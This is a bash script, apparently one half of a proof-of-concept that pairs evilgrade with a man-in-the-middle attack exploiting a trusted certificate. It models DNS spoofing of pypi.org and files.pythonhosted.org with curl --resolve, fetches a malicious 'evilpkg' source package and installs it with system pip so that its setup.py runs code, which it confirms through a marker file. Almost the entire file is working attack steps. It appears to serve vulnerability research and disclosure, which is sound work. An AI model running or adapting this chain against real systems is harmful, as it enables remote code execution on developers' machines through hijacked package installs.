#!/bin/bash
###############################################################################
# victim_pip.sh - VICTIM side only. Fetches pip's index + sdist from an
#                 evilgrade you already started in another console, then runs
#                 the sdist's setup.py (the RCE) locally.
#
# Does NOT start or stop evilgrade. pip has no --resolve, so this fetches the
# malicious sdist via curl --resolve (modeling the DNS spoof) and then installs
# it to show setup.py executing. For a true one-shot, DNS-spoof pypi.org +
# files.pythonhosted.org to evilgrade and run:
#   /usr/bin/python3 -m pip install --index-url https://pypi.org/simple/ evilpkg
#
# Usage:
#   demo/emudhra_mitm/victim_pip.sh [sslport]      (default 443)
#
# Use the SYSTEM python3 (/usr/bin/python3). Homebrew's python is NOT affected.
###############################################################################
set -u
PORT="${1:-443}"
host_url() { if [ "$PORT" = "443" ]; then echo "https://$1"; else echo "https://$1:$PORT"; fi; }
R_PY="pypi.org:${PORT}:127.0.0.1"; R_FILES="files.pythonhosted.org:${PORT}:127.0.0.1"

rm -f /tmp/OWNED_BY_PIP
echo "== A) TRANSPORT: fetch pip index + sdist from evilgrade on :$PORT =="
echo "   index:"
/usr/bin/curl -s --resolve "$R_PY" "$(host_url pypi.org)/simple/evilpkg/" \
  -w "      [HTTP %{http_code}, ssl_verify_result=%{ssl_verify_result}]\n" | sed 's/^/   /'
echo "   sdist:"
if ! /usr/bin/curl -s --resolve "$R_FILES" "$(host_url files.pythonhosted.org)/packages/evilpkg-1.0.tar.gz" \
     -o /tmp/evilpkg.tgz -w "      [HTTP %{http_code}] %{size_download} bytes\n"; then
    echo "   !! fetch failed. Is evilgrade on :$PORT with pypi_update enabled + sslcert certs/emudhra_mitm?"
    exit 1
fi

echo
echo "== B) RCE: setup.py runs at install time =="
rm -rf /tmp/pip_rce && mkdir -p /tmp/pip_rce && tar xzf /tmp/evilpkg.tgz -C /tmp/pip_rce 2>/dev/null
SSL_CERT_FILE=/etc/ssl/cert.pem /usr/bin/python3 -m pip install --no-cache-dir --no-build-isolation \
  --disable-pip-version-check --quiet /tmp/pip_rce/evilpkg-1.0 2>&1 | tail -2 | sed 's/^/   /'
/usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
sleep 1
echo "== PROOF: /tmp/OWNED_BY_PIP =="
[ -f /tmp/OWNED_BY_PIP ] && sed 's/^/   /' /tmp/OWNED_BY_PIP || echo "   <not created>"
